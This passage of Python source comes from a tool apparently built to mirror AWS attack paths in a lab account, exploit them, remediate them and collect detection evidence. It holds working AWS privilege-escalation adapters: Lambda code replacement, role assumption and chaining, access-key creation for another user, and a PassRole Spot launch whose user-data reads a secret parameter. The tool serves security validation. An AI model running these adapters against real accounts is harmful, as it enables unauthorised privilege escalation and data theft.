        blocker_json = json.dumps(blockers)
        blocks.append(f'''
resource "terraform_data" "coverage_gate" {{
  lifecycle {{
    precondition {{
      condition     = var.allow_partial_reconstruction
      error_message = "Generic reconstruction has unresolved blockers: ${{jsonencode({blocker_json})}}"
    }}
  }}
}}
''')
    outputs.extend(
        [
            '''output "mirror_account_id" {
  value = data.aws_caller_identity.current.account_id
}''',
            f'''output "scenario_id" {{
  value = {json.dumps(scenario.scenario_id)}
}}''',
            f'''output "reconstruction_status" {{
  value = {json.dumps(coverage['overall'])}
}}''',
        ]
    )
    files = {
        "main.tf": tf_replace("\n".join(blocks), scenario),
        "variables.tf": tf_replace(COMMON_VARIABLES + variable_extra, scenario),
        "outputs.tf": "\n\n".join(outputs) + "\n",
        "terraform-coverage.json": json.dumps(coverage, indent=2, ensure_ascii=False) + "\n",
    }
    files.update(fixtures)
    return files


def terraform_files(
    scenario: Scenario,
    nodes: dict[str, Node],
    edges: list[Edge],
    context_evidence: dict[str, Any] | None = None,
) -> dict[str, str]:
    renderers = {
        "lambda_update_invoke_admin": lambda: lambda_terraform(scenario, nodes),
        "sts_assume_admin": lambda: sts_terraform(scenario),
        "iam_create_access_key_s3": lambda: create_key_terraform(scenario),
        "role_chain_s3": lambda: role_chain_terraform(scenario),
        "ec2_passrole_spot_admin": lambda: ec2_terraform(scenario),
        "generic_awshound_path": lambda: generic_terraform(scenario, nodes, edges, context_evidence),
    }
    renderer = renderers.get(scenario.scenario_type)
    if not renderer:
        raise PipelineError(f"Terraform renderer is not implemented: {scenario.scenario_type}")
    return renderer()


def required_inputs(scenario: Scenario) -> dict[str, Any]:
    inputs: list[dict[str, Any]] = [
        {
            "name": "resource_name_prefix",
            "source": "USER_REQUIRED",
            "reason": "New mirror names and a run identifier do not exist in the source graph.",
        },
        {
            "name": "synthetic_flag",
            "source": "USER_REQUIRED",
            "reason": "Source secret and object values are intentionally not copied.",
            "sensitive": True,
        },
        {
            "name": "target_aws_profile",
            "source": "AWS_SDK_CREDENTIAL_CHAIN",
            "reason": "Target credentials are never written to Terraform variables.",
            "sensitive": True,
        },
        {
            "name": "expected_target_account_id",
            "source": "USER_REQUIRED",
            "reason": "The tool verifies the exact deployment account before any mutation.",
        },
    ]
    if scenario.scenario_type == "ec2_passrole_spot_admin":
        inputs.extend(
            [
                {
                    "name": "mirror_ami_id",
                    "source": "USER_REQUIRED",
                    "reason": "The graph describes permission to create a new instance, not a source instance or AMI.",
                },
                {
                    "name": "mirror_instance_type",
                    "source": "USER_OR_DEFAULT",
                    "default": "t3.micro",
                },
            ]
        )
    if scenario.scenario_type == "generic_awshound_path":
        inputs.extend(
            [
                {
                    "name": "artifact_mode",
                    "source": "USER_DECISION",
                    "allowed": ["synthetic", "approved-copy"],
                    "reason": "Code and disk artifacts are not contained in AWSHound OpenGraph.",
                },
                {
                    "name": "allow_partial_reconstruction",
                    "source": "USER_ACKNOWLEDGEMENT",
                    "default": False,
                    "reason": "Terraform blocks apply when an official node/edge lacks a safe renderer.",
                },
            ]
        )
    return {
        "status": "USER_INPUT_REQUIRED",
        "inputs": inputs,
        "prohibited_inputs": [
            "Production secrets",
            "Source account access keys",
            "Customer data",
        ],
    }


def tfvars_example(scenario: Scenario) -> str:
    lines = [
        'resource_name_prefix  = "REQUIRED_UNIQUE_PREFIX"',
        'synthetic_flag        = "REQUIRED_NON_PRODUCTION_TEST_VALUE"',
        "enable_vulnerable_path = true",
    ]
    if scenario.scenario_type == "ec2_passrole_spot_admin":
        lines.extend(
            [
                'mirror_ami_id        = "REQUIRED_AMI_ID"',
                'mirror_instance_type = "t3.micro"',
            ]
        )
    return "\n".join(lines) + "\n"


GENERATED_README = r'''# AWSHound minimal mirror: @@SCENARIO_ID@@

This directory was generated by `mirrorctl prepare`.

## Safety model

- Source ARNs are retained only as evidence in JSON manifests; generated Terraform does not reference them.
- Source credentials, secrets, object content, and snapshots are not copied.
- All business data is replaced with a synthetic canary.
- Terraform does not run during `prepare`.
- `deploy`, `attack`, `remediate`, and `destroy` each require a separate exact approval token.
- Runtime attack adapters can use only resource names returned by this Terraform state.

## Required values

Copy `terraform.tfvars.example` to `terraform.tfvars` and replace every
`REQUIRED_*` value.  AWS credentials are supplied only through an AWS CLI
profile when invoking `mirrorctl`.

## Lifecycle

```powershell
py ..\..\mirrorctl.py deploy --run-dir . --target-profile PROFILE --expected-account-id 123456789012 --approve APPLY
py ..\..\mirrorctl.py attack --run-dir . --target-profile PROFILE --expected-account-id 123456789012 --approve ATTACK
py ..\..\mirrorctl.py evidence --run-dir . --target-profile PROFILE --expected-account-id 123456789012
py ..\..\mirrorctl.py remediate --run-dir . --target-profile PROFILE --expected-account-id 123456789012 --approve FIX
py ..\..\mirrorctl.py retest --run-dir . --target-profile PROFILE --expected-account-id 123456789012 --approve RETEST
py ..\..\mirrorctl.py destroy --run-dir . --target-profile PROFILE --expected-account-id 123456789012 --approve DESTROY
```
'''


def generate_scenario_directory(
    root: Path,
    scenario: Scenario,
    nodes: dict[str, Node],
    edges: list[Edge],
    requests: list[ContextRequest],
    source_hash: str,
    context_evidence: dict[str, Any] | None = None,
) -> Path:
    destination = root / scenario.scenario_id
    destination.mkdir(parents=True, exist_ok=True)
    for relative_name, content in terraform_files(scenario, nodes, edges, context_evidence).items():
        path = destination / relative_name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8", newline="\n")
    (destination / "terraform.tfvars.example").write_text(
        tfvars_example(scenario), encoding="utf-8", newline="\n"
    )
    (destination / "README.md").write_text(
        tf_replace(GENERATED_README, scenario), encoding="utf-8", newline="\n"
    )
    write_json(destination / "minimal-reproduction-spec.json", minimal_spec(scenario, nodes, edges, requests))
    write_json(destination / "context-api-plan.json", [asdict(request) for request in requests])
    write_json(destination / "artifact-plan.json", artifact_plan_for(scenario, nodes, edges))
    write_json(destination / "attack-plan.json", attack_plan_for(scenario, nodes, edges))
    write_json(
        destination / "validation-contract.json",
        validation_contract_for(scenario, nodes, edges),
    )
    write_json(
        destination / "source-subgraph.json",
        {
            "nodes": [
                {
                    "id": node_id,
                    "kinds": list(nodes[node_id].kinds),
                    "properties": nodes[node_id].properties,
                }
                for node_id in scenario.node_ids
            ],
            "edges": [
                {
                    "kind": edge.kind,
                    "start": edge.start,
                    "end": edge.end,
                    "properties": edge.properties,
                }
                for edge in edges
                if edge.start in scenario.node_ids and edge.end in scenario.node_ids
            ],
        },
    )
    write_json(destination / "required-inputs.json", required_inputs(scenario))
    write_json(
        destination / "run-manifest.json",
        {
            "tool": "mirrorctl",
            "tool_version": VERSION,
            "created_at": utc_now(),
            "source_sha256": source_hash,
            "scenario": asdict(scenario),
            "safety": {
                "automatic_apply": False,
                "automatic_attack": False,
                "source_data_copied": False,
                "synthetic_validation_assets": True,
                "target_account_verification_required": True,
            },
        },
    )
    return destination


def load_manifest(run_dir: Path) -> dict[str, Any]:
    path = run_dir / "run-manifest.json"
    if not path.is_file():
        raise PipelineError(f"run manifest is missing: {path}")
    return json.loads(path.read_text(encoding="utf-8"))


def state_path(run_dir: Path) -> Path:
    return run_dir / ".mirrorctl" / "state.json"


def load_state(run_dir: Path) -> dict[str, Any]:
    path = state_path(run_dir)
    if not path.exists():
        return {"state_version": "1.0", "history": []}
    return json.loads(path.read_text(encoding="utf-8"))


def save_state(run_dir: Path, state: dict[str, Any]) -> None:
    state["updated_at"] = utc_now()
    write_json(state_path(run_dir), state)


def append_history(
    run_dir: Path, operation: str, status: str, details: dict[str, Any] | None = None
) -> None:
    state = load_state(run_dir)
    state.setdefault("history", []).append(
        {
            "operation": operation,
            "status": status,
            "at": utc_now(),
            "details": details or {},
        }
    )
    state[operation] = {"status": status, "at": utc_now(), **(details or {})}
    save_state(run_dir, state)


def approval(actual: str | None, expected: str) -> None:
    if actual != expected:
        raise PipelineError(f"operation requires --approve {expected}")


def verify_target(
    run_dir: Path,
    profile: str,
    expected_account_id: str,
    allow_source_account: bool,
) -> dict[str, Any]:
    if not re.fullmatch(r"\d{12}", expected_account_id):
        raise PipelineError("--expected-account-id must be a 12-digit AWS account ID")
    manifest = load_manifest(run_dir)
    scenario = manifest["scenario"]
    identity = aws_identity(profile, scenario.get("region"))
    actual = str(identity.get("Account", ""))
    if actual != expected_account_id:
        raise PipelineError(
            f"target profile account mismatch: expected={expected_account_id}, actual={actual}"
        )
    source = str(scenario.get("source_account_id", "UNKNOWN"))
    if actual == source and not allow_source_account:
        raise PipelineError(
            "target is the source account. Use a separate mirror account, or pass "
            "--allow-source-account only for an explicitly authorized disposable lab."
        )
    return identity


def terraform_available() -> None:
    if shutil.which("terraform") is None:
        raise PipelineError("terraform is not installed or not available in PATH")


def terraform_env(profile: str, region: str) -> dict[str, str]:
    env = os.environ.copy()
    env["AWS_PROFILE"] = profile
    env["AWS_REGION"] = region
    env["AWS_DEFAULT_REGION"] = region
    for key in ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN"):
        env.pop(key, None)
    return env


def run_checked(
    command: list[str], *, cwd: Path, env: dict[str, str], timeout: int = 600
) -> subprocess.CompletedProcess[str]:
    result = run_command(command, cwd=cwd, env=env, timeout=timeout)
    if result.returncode != 0:
        raise PipelineError(
            f"command failed ({' '.join(command[:3])}): {result.stderr.strip() or result.stdout.strip()}"
        )
    return result


def deploy_mirror(
    run_dir: Path,
    profile: str,
    expected_account: str,
    allow_source_account: bool,
) -> None:
    terraform_available()
    manifest = load_manifest(run_dir)
    region = manifest["scenario"]["region"]
    identity = verify_target(run_dir, profile, expected_account, allow_source_account)
    if not (run_dir / "terraform.tfvars").is_file():
        raise PipelineError(
            "terraform.tfvars is missing. Copy terraform.tfvars.example and fill required values."
        )
    env = terraform_env(profile, region)
    started = utc_now()
    run_checked(["terraform", "init", "-input=false"], cwd=run_dir, env=env)
    run_checked(["terraform", "fmt", "-recursive"], cwd=run_dir, env=env)
    run_checked(["terraform", "validate"], cwd=run_dir, env=env)
    plan_path = run_dir / ".mirrorctl" / "apply.tfplan"
    plan_path.parent.mkdir(parents=True, exist_ok=True)
    run_checked(
        [
            "terraform",
            "plan",
            "-input=false",
            "-out",
            str(plan_path),
        ],
        cwd=run_dir,
        env=env,
    )
    run_checked(
        ["terraform", "apply", "-input=false", "-auto-approve", str(plan_path)],
        cwd=run_dir,
        env=env,
        timeout=1200,
    )
    append_history(
        run_dir,
        "deployment",
        "DEPLOYED",
        {
            "started_at": started,
            "completed_at": utc_now(),
            "target_account_id": identity["Account"],
            "target_identity_arn": identity["Arn"],
            "target_profile": profile,
        },
    )


def terraform_outputs(run_dir: Path) -> dict[str, Any]:
    terraform_available()
    result = run_checked(
        ["terraform", "output", "-json"],
        cwd=run_dir,
        env=os.environ.copy(),
    )
    raw = json.loads(result.stdout)
    return {name: item.get("value") for name, item in raw.items()}


def require_outputs(outputs: dict[str, Any], names: Iterable[str]) -> None:
    missing = [name for name in names if not outputs.get(name)]
    if missing:
        raise PipelineError("Terraform outputs are missing: " + ", ".join(missing))


def attacker_env(outputs: dict[str, Any], region: str) -> dict[str, str]:
    require_outputs(outputs, ["starting_access_key_id", "starting_secret_access_key"])
    env = os.environ.copy()
    for key in ("AWS_PROFILE", "AWS_SESSION_TOKEN"):
        env.pop(key, None)
    env["AWS_ACCESS_KEY_ID"] = str(outputs["starting_access_key_id"])
    env["AWS_SECRET_ACCESS_KEY"] = str(outputs["starting_secret_access_key"])
    env["AWS_REGION"] = region
    env["AWS_DEFAULT_REGION"] = region
    return env


def role_env(credentials: dict[str, Any], region: str) -> dict[str, str]:
    env = os.environ.copy()
    env.pop("AWS_PROFILE", None)
    env["AWS_ACCESS_KEY_ID"] = credentials["AccessKeyId"]
    env["AWS_SECRET_ACCESS_KEY"] = credentials["SecretAccessKey"]
    env["AWS_SESSION_TOKEN"] = credentials["SessionToken"]
    env["AWS_REGION"] = region
    env["AWS_DEFAULT_REGION"] = region
    return env


def aws_with_env(
    args: list[str], env: dict[str, str], *, timeout: int = 120, expect_json: bool = True
) -> Any:
    command = ["aws", *args, "--no-cli-pager"]
    if expect_json and "--output" not in args:
        command.extend(["--output", "json"])
    result = run_command(command, env=env, timeout=timeout)
    if result.returncode != 0:
        raise PipelineError(result.stderr.strip() or result.stdout.strip())
    if not expect_json:
        return result.stdout
    return json.loads(result.stdout or "{}")


def aws_with_profile(
    args: list[str], profile: str, region: str, *, timeout: int = 120, allow_failure: bool = False
) -> tuple[int, Any]:
    command = [
        "aws",
        *args,
        "--profile",
        profile,
        "--region",
        region,
        "--output",
        "json",
        "--no-cli-pager",
    ]
    result = run_command(command, timeout=timeout)
    if result.returncode != 0:
        if allow_failure:
            return result.returncode, result.stderr.strip()
        raise PipelineError(result.stderr.strip() or result.stdout.strip())
    return 0, json.loads(result.stdout or "{}")


def assume_role(role_arn: str, env: dict[str, str], session_name: str) -> dict[str, Any]:
    result = aws_with_env(
        [
            "sts",
            "assume-role",
            "--role-arn",
            role_arn,
            "--role-session-name",
            session_name,
            "--duration-seconds",
            "900",
        ],
        env,
    )
    return result["Credentials"]


def is_authorization_denial(message: str) -> bool:
    lower = message.lower()
    needles = (
        "accessdenied",
        "access denied",
        "unauthorizedoperation",
        "not authorized to perform",
        "explicit deny",
    )
    return any(needle in lower for needle in needles)


def hash_text(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def timestamp_millis(value: Any) -> int:
    if isinstance(value, (int, float)):
        return int(value)
    if isinstance(value, str):
        text = value.replace("Z", "+00:00")
        try:
            return int(dt.datetime.fromisoformat(text).timestamp() * 1000)
        except ValueError:
            return 0
    return 0


def parse_utc(value: str) -> dt.datetime:
    return dt.datetime.fromisoformat(value.replace("Z", "+00:00"))


def attack_lambda(run_dir: Path, outputs: dict[str, Any], region: str) -> dict[str, Any]:
    require_outputs(
        outputs,
        ["target_lambda_name", "flag_parameter_name", "synthetic_flag_sha256"],
    )
    payload = '''import boto3
import hashlib
import os

def lambda_handler(event, context):
    value = boto3.client("ssm").get_parameter(
        Name=os.environ["MIRROR_FLAG_PARAMETER"]
    )["Parameter"]["Value"]
    return {"statusCode": 200, "flag_sha256": hashlib.sha256(value.encode()).hexdigest()}
'''
    env = attacker_env(outputs, region)
    with tempfile.TemporaryDirectory() as temporary:
        root = Path(temporary)
        source = root / "lambda_function.py"
        source.write_text(payload, encoding="utf-8", newline="\n")
        archive = root / "payload.zip"
        with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as output_zip:
            output_zip.write(source, "lambda_function.py")
        update = aws_with_env(
            [
                "lambda",
                "update-function-code",
                "--function-name",
                str(outputs["target_lambda_name"]),
                "--zip-file",
                f"fileb://{archive.as_posix()}",
                "--region",
                region,
            ],
            env,
            timeout=180,
        )
        aws_with_env(
            [
                "lambda",
                "wait",
                "function-updated-v2",
                "--function-name",
                str(outputs["target_lambda_name"]),
                "--region",
                region,
            ],
            env,
            expect_json=False,
            timeout=300,
        )
        response_file = root / "response.json"
        invoke = aws_with_env(
            [
                "lambda",
                "invoke",
                "--function-name",
                str(outputs["target_lambda_name"]),
                "--cli-binary-format",
                "raw-in-base64-out",
                "--payload",
                "{}",
                "--region",
                region,
                str(response_file),
            ],
            env,
            timeout=180,
        )
        response = json.loads(response_file.read_text(encoding="utf-8"))
    if invoke.get("FunctionError"):
        raise PipelineError(f"Lambda returned FunctionError: {response}")
    actual_hash = response.get("flag_sha256")
    if actual_hash != outputs["synthetic_flag_sha256"]:
        raise PipelineError("Lambda ran, but the privilege-use canary hash did not match")
    return {
        "status": "EXPLOITABLE",
        "proof": "Updated Lambda code executed with the target role and read the synthetic SSM canary.",
        "code_sha256": update.get("CodeSha256"),
        "invoke_status_code": invoke.get("StatusCode"),
        "canary_sha256": actual_hash,
    }


def attack_sts(outputs: dict[str, Any], region: str) -> dict[str, Any]:
    require_outputs(outputs, ["target_role_arn", "flag_parameter_name", "synthetic_flag_sha256"])
    first_env = attacker_env(outputs, region)
    credentials = assume_role(str(outputs["target_role_arn"]), first_env, "mirror-sts-validation")
    assumed_env = role_env(credentials, region)
    response = aws_with_env(
        [
            "ssm",
            "get-parameter",
            "--name",
            str(outputs["flag_parameter_name"]),
            "--region",
            region,
        ],
        assumed_env,
    )
    value = response["Parameter"]["Value"]
    if hash_text(value) != outputs["synthetic_flag_sha256"]:
        raise PipelineError("Assumed role could not produce the expected canary hash")
    identity = aws_with_env(["sts", "get-caller-identity"], assumed_env)
    return {
        "status": "EXPLOITABLE",
        "proof": "The starting user assumed the target role and read the synthetic SSM canary.",
        "assumed_arn": identity.get("Arn"),
        "canary_sha256": hash_text(value),
    }


def attack_create_key(
    outputs: dict[str, Any], region: str, target_profile: str
) -> dict[str, Any]:
    require_outputs(
        outputs,
        [
            "access_target_user_name",
            "target_bucket_name",
            "target_object_key",
            "synthetic_flag_sha256",
        ],
    )
    initial_env = attacker_env(outputs, region)
    access_key_id: str | None = None
    try:
        created = aws_with_env(
            [
                "iam",
                "create-access-key",
                "--user-name",
                str(outputs["access_target_user_name"]),
            ],
            initial_env,
        )["AccessKey"]
        access_key_id = created["AccessKeyId"]
        created_env = os.environ.copy()
        created_env.pop("AWS_PROFILE", None)
        created_env["AWS_ACCESS_KEY_ID"] = created["AccessKeyId"]
        created_env["AWS_SECRET_ACCESS_KEY"] = created["SecretAccessKey"]
        created_env.pop("AWS_SESSION_TOKEN", None)
        created_env["AWS_REGION"] = region
        created_env["AWS_DEFAULT_REGION"] = region
        with tempfile.TemporaryDirectory() as temporary:
            downloaded = Path(temporary) / "flag.txt"
            last_error = ""
            for _ in range(6):
                result = run_command(
                    [
                        "aws",
                        "s3api",
                        "get-object",
                        "--bucket",
                        str(outputs["target_bucket_name"]),
                        "--key",
                        str(outputs["target_object_key"]),
                        str(downloaded),
                        "--region",
                        region,
                        "--no-cli-pager",
                    ],
                    env=created_env,
                )
                if result.returncode == 0:
                    break
                last_error = result.stderr.strip()
                time.sleep(3)
            else:
                raise PipelineError(last_error or "new access key could not read the object")
            actual_hash = sha256_bytes(downloaded.read_bytes())
        if actual_hash != outputs["synthetic_flag_sha256"]:
            raise PipelineError("S3 object hash did not match the synthetic canary")
        return {
            "status": "EXPLOITABLE",
            "proof": "The starting user created credentials for another user and read its synthetic S3 object.",
            "created_access_key_id": access_key_id,
            "canary_sha256": actual_hash,
        }
    finally:
        if access_key_id:
            aws_with_profile(
                [
                    "iam",
                    "delete-access-key",
                    "--user-name",
                    str(outputs["access_target_user_name"]),
                    "--access-key-id",
                    access_key_id,
                ],
                target_profile,
                region,
                allow_failure=True,
            )


def attack_role_chain(outputs: dict[str, Any], region: str) -> dict[str, Any]:
    require_outputs(
        outputs,
        [
            "initial_role_arn",
            "intermediate_role_arn",
            "s3_access_role_arn",
            "target_bucket_name",
            "target_object_key",
            "synthetic_flag_sha256",
        ],
    )
    env = attacker_env(outputs, region)
    hops: list[str] = []
    for index, key in enumerate(
        ["initial_role_arn", "intermediate_role_arn", "s3_access_role_arn"], start=1
    ):
        role_arn = str(outputs[key])
        credentials = assume_role(role_arn, env, f"mirror-chain-{index}")
        env = role_env(credentials, region)
        hops.append(role_arn)
    with tempfile.TemporaryDirectory() as temporary:
        downloaded = Path(temporary) / "flag.txt"
        result = run_command(
            [
                "aws",
                "s3api",
                "get-object",
                "--bucket",
                str(outputs["target_bucket_name"]),
                "--key",
                str(outputs["target_object_key"]),
                str(downloaded),
                "--region",
                region,
                "--no-cli-pager",
            ],
            env=env,
        )
        if result.returncode != 0:
            raise PipelineError(result.stderr.strip())
        actual_hash = sha256_bytes(downloaded.read_bytes())
    if actual_hash != outputs["synthetic_flag_sha256"]:
        raise PipelineError("S3 object hash did not match the synthetic canary")
    return {
        "status": "EXPLOITABLE",
        "proof": "The starting user traversed the role chain and read the synthetic S3 object.",
        "role_hops": hops,
        "canary_sha256": actual_hash,
    }


def attack_ec2(
    outputs: dict[str, Any], region: str, target_profile: str
) -> dict[str, Any]:
    require_outputs(
        outputs,
        [
            "instance_profile_arn",
            "mirror_subnet_id",
            "mirror_security_group_id",
            "mirror_ami_id",
            "mirror_instance_type",
            "flag_parameter_name",
            "evidence_parameter_name",
            "synthetic_flag_sha256",
        ],
    )
    aws_with_profile(
        ["ssm", "delete-parameter", "--name", str(outputs["evidence_parameter_name"])],
        target_profile,
        region,
        allow_failure=True,
    )
    user_data = f'''#!/bin/bash
set -euo pipefail
VALUE=$(aws ssm get-parameter --name {outputs["flag_parameter_name"]} --region {region} --query Parameter.Value --output text)
HASH=$(printf %s "$VALUE" | sha256sum | awk '{{print $1}}')
aws ssm put-parameter --name {outputs["evidence_parameter_name"]} --type String --value "$HASH" --overwrite --region {region}
shutdown -h now
'''
    launch = {
        "ImageId": outputs["mirror_ami_id"],
        "InstanceType": outputs["mirror_instance_type"],
        "IamInstanceProfile": {"Arn": outputs["instance_profile_arn"]},
        "UserData": base64.b64encode(user_data.encode("utf-8")).decode("ascii"),
        "NetworkInterfaces": [
            {
                "DeviceIndex": 0,
                "AssociatePublicIpAddress": False,
                "SubnetId": outputs["mirror_subnet_id"],
                "Groups": [outputs["mirror_security_group_id"]],
            }
        ],
    }
    env = attacker_env(outputs, region)
    request_id: str | None = None
    instance_id: str | None = None
    with tempfile.TemporaryDirectory() as temporary:
        launch_file = Path(temporary) / "launch.json"
        launch_file.write_text(json.dumps(launch), encoding="utf-8")
        try:
            response = aws_with_env(
                [
                    "ec2",
                    "request-spot-instances",
                    "--instance-count",
                    "1",
                    "--type",
                    "one-time",
                    "--launch-specification",
                    f"file://{launch_file.as_posix()}",
                    "--region",
                    region,
                ],
                env,
                timeout=180,
            )
            request_id = response["SpotInstanceRequests"][0]["SpotInstanceRequestId"]
            deadline = time.time() + 600
            while time.time() < deadline:
                _, described = aws_with_profile(
                    [
                        "ec2",
                        "describe-spot-instance-requests",
                        "--spot-instance-request-ids",
                        request_id,
                    ],
                    target_profile,
                    region,
                )
                instance_id = described["SpotInstanceRequests"][0].get("InstanceId")
                if instance_id:
                    break
                time.sleep(10)
            if not instance_id:
                raise PipelineError("Spot request did not receive an instance within 10 minutes")
            while time.time() < deadline:
                code, response_or_error = aws_with_profile(
                    [
                        "ssm",
                        "get-parameter",
                        "--name",
                        str(outputs["evidence_parameter_name"]),
                    ],
                    target_profile,
                    region,
                    allow_failure=True,
                )
                if code == 0:
                    actual_hash = response_or_error["Parameter"]["Value"]
                    if actual_hash != outputs["synthetic_flag_sha256"]:
                        raise PipelineError("EC2 canary hash did not match")
                    return {
                        "status": "EXPLOITABLE",
                        "proof": "A Spot instance launched with the passed admin role and wrote the privilege-use canary.",
                        "spot_request_id": request_id,
                        "instance_id": instance_id,
                        "canary_sha256": actual_hash,
                    }
                time.sleep(10)
            raise PipelineError("EC2 instance did not write the evidence parameter within 10 minutes")
        finally:
            if request_id:
                aws_with_profile(
                    ["ec2", "cancel-spot-instance-requests", "--spot-instance-request-ids", request_id],
                    target_profile,
                    region,
                    allow_failure=True,
                )
            if instance_id:
                aws_with_profile(
                    ["ec2", "terminate-instances", "--instance-ids", instance_id],
                    target_profile,
                    region,
                    allow_failure=True,
                )


def execute_attack(
    run_dir: Path,
    target_profile: str,
    expect_blocked: bool,
) -> dict[str, Any]:
    manifest = load_manifest(run_dir)
    scenario = manifest["scenario"]
    scenario_type = scenario["scenario_type"]
    region = scenario["region"]
    outputs = terraform_outputs(run_dir)
    started = utc_now()
    try:
        if scenario_type == "lambda_update_invoke_admin":
            result = attack_lambda(run_dir, outputs, region)
        elif scenario_type == "sts_assume_admin":
            result = attack_sts(outputs, region)
        elif scenario_type == "iam_create_access_key_s3":
            result = attack_create_key(outputs, region, target_profile)
        elif scenario_type == "role_chain_s3":
            result = attack_role_chain(outputs, region)
        elif scenario_type == "ec2_passrole_spot_admin":
            result = attack_ec2(outputs, region, target_profile)
        else:
            raise PipelineError(f"attack adapter is not implemented: {scenario_type}")
    except PipelineError as exc:
        if expect_blocked and is_authorization_denial(str(exc)):
            return {
                "status": "ATTACK_BLOCKED",
                "proof": "The first required attack action was denied after remediation.",
                "started_at": started,
                "completed_at": utc_now(),
                "denial": str(exc)[-2000:],
            }
        raise
    result["started_at"] = started
    result["completed_at"] = utc_now()
    if expect_blocked:
        raise PipelineError("retest failed: the attack still succeeded after remediation")
    return result


def remediate_mirror(run_dir: Path, profile: str, region: str) -> None:
    terraform_available()
    env = terraform_env(profile, region)
    run_checked(
        [
            "terraform",
            "apply",
            "-input=false",
            "-auto-approve",
            "-var=enable_vulnerable_path=false",
        ],
        cwd=run_dir,
        env=env,
        timeout=1200,
    )


def collect_trail_data_events(
    *,
    bucket: str,
    account_id: str,
    region: str,
    profile: str,
    started: str,
    event_names: list[str],
    correlation_texts: list[str],
) -> dict[str, Any]:
    if not event_names:
        return {"status": "NOT_REQUIRED", "events": []}
    start_dt = parse_utc(started)
    today = dt.datetime.now(dt.timezone.utc)
    dates: list[dt.date] = []
    cursor = start_dt.date()
    while cursor <= today.date() and len(dates) < 3:
        dates.append(cursor)
        cursor += dt.timedelta(days=1)
    objects: list[dict[str, Any]] = []
    for day in dates:
        prefix = f"AWSLogs/{account_id}/CloudTrail/{region}/{day:%Y/%m/%d}/"
        code, response = aws_with_profile(
            ["s3api", "list-objects-v2", "--bucket", bucket, "--prefix", prefix],
            profile,
            region,
            allow_failure=True,
        )
        if code != 0:
            return {"status": "TRAIL_LOG_QUERY_UNAVAILABLE", "events": [], "error": response}
        objects.extend(response.get("Contents", []))
    matching: list[dict[str, Any]] = []
    with tempfile.TemporaryDirectory() as temporary:
        root = Path(temporary)
        for index, item in enumerate(sorted(objects, key=lambda value: value.get("LastModified", ""))[-100:]):
            key = item.get("Key")
            if not key or not key.endswith(".json.gz"):
                continue
            destination = root / f"trail-{index}.json.gz"
            result = run_command(
                [
                    "aws",
                    "s3api",
                    "get-object",
                    "--bucket",
                    bucket,
                    "--key",
                    key,
                    str(destination),
                    "--profile",
                    profile,
                    "--region",
                    region,
                    "--no-cli-pager",
                ],
                timeout=120,
            )
            if result.returncode != 0:
                continue
            try:
                with gzip.open(destination, "rt", encoding="utf-8") as stream:
                    document = json.load(stream)
            except (OSError, json.JSONDecodeError):
                continue
            for record in document.get("Records", []):
                event_time = record.get("eventTime")
                if not event_time:
                    continue
                try:
                    if parse_utc(event_time) < start_dt:
                        continue
                except ValueError:
                    continue
                if record.get("eventName") not in event_names:
                    continue
                serialized = json.dumps(record, ensure_ascii=False)
                if correlation_texts and not any(text in serialized for text in correlation_texts):
                    continue
                matching.append(record)
    return {
        "status": "COLLECTED" if matching else "NOT_FOUND_OR_NOT_YET_DELIVERED",
        "events": matching,
        "objects_examined": len(objects),
    }


def collect_detection_evidence(
    run_dir: Path, profile: str, region: str
) -> dict[str, Any]:
    manifest = load_manifest(run_dir)
    state = load_state(run_dir)
    attack_state = state.get("attack") or state.get("retest") or {}
    started = attack_state.get("started_at") or state.get("deployment", {}).get("started_at")
    if not started:
        raise PipelineError("no deployment or attack timestamp is available for evidence correlation")
    expectations = detection_expectations_for(
        Scenario(**manifest["scenario"])
    )
    outputs = terraform_outputs(run_dir)
    management: dict[str, Any] = {}
    for event_name in expectations["management_events"]:
        code, response = aws_with_profile(
            [
                "cloudtrail",
                "lookup-events",
                "--lookup-attributes",
                f"AttributeKey=EventName,AttributeValue={event_name}",
                "--start-time",
                started,
                "--max-results",
                "50",
            ],
            profile,
            region,
            allow_failure=True,
        )
        management[event_name] = {
            "status": "COLLECTED" if code == 0 else "UNAVAILABLE",
            "events": response.get("Events", []) if code == 0 else [],
            "error": response if code != 0 else None,
        }

    guardduty: dict[str, Any] = {"status": "NOT_ENABLED", "correlated_findings": []}
    code, detectors = aws_with_profile(
        ["guardduty", "list-detectors"], profile, region, allow_failure=True
    )
    if code == 0 and detectors.get("DetectorIds"):
        guardduty["status"] = "NO_CORRELATED_FINDING"
        prefix = str(outputs.get("starting_user_name", ""))
        started_ms = int(dt.datetime.fromisoformat(started).timestamp() * 1000)
        for detector_id in detectors["DetectorIds"]:
            _, listed = aws_with_profile(
                [
                    "guardduty",
                    "list-findings",
                    "--detector-id",
                    detector_id,
                    "--max-results",
                    "50",
                ],
                profile,
                region,
                allow_failure=True,
            )
            ids = listed.get("FindingIds", []) if isinstance(listed, dict) else []
            if not ids:
                continue
            _, found = aws_with_profile(
                [
                    "guardduty",
                    "get-findings",
                    "--detector-id",
                    detector_id,
                    "--finding-ids",
                    *ids,
                ],
                profile,
                region,
                allow_failure=True,
            )
            for finding in found.get("Findings", []) if isinstance(found, dict) else []:
                serialized = json.dumps(finding, ensure_ascii=False)
                if timestamp_millis(finding.get("UpdatedAt")) >= started_ms and prefix and prefix in serialized:
                    guardduty["correlated_findings"].append(finding)
        if guardduty["correlated_findings"]:
            guardduty["status"] = "DETECTED"

    data_events = collect_trail_data_events(
        bucket=str(outputs.get("cloudtrail_bucket_name", "")),
        account_id=str(outputs.get("mirror_account_id", "")),
        region=region,
        profile=profile,
        started=started,
        event_names=list(expectations["data_events"]),
        correlation_texts=[
            str(outputs[name])
            for name in (
                "starting_user_name",
                "access_target_user_name",
                "target_bucket_name",
                "target_lambda_name",
                "s3_access_role_arn",
            )
            if outputs.get(name)
        ],
    ) if outputs.get("cloudtrail_bucket_name") else {
        "status": "TRAIL_NOT_MANAGED_BY_MIRROR",
        "events": [],
    }
    management_count = sum(len(item["events"]) for item in management.values())
    data_count = len(data_events.get("events", []))
    overall = "DETECTED" if guardduty["status"] == "DETECTED" else (
        "LOGGED_ONLY" if management_count or data_count else "BLIND_OR_NOT_YET_DELIVERED"
    )
    return {
        "collected_at": utc_now(),
        "window_start": started,
        "overall": overall,
        "cloudtrail_management": management,
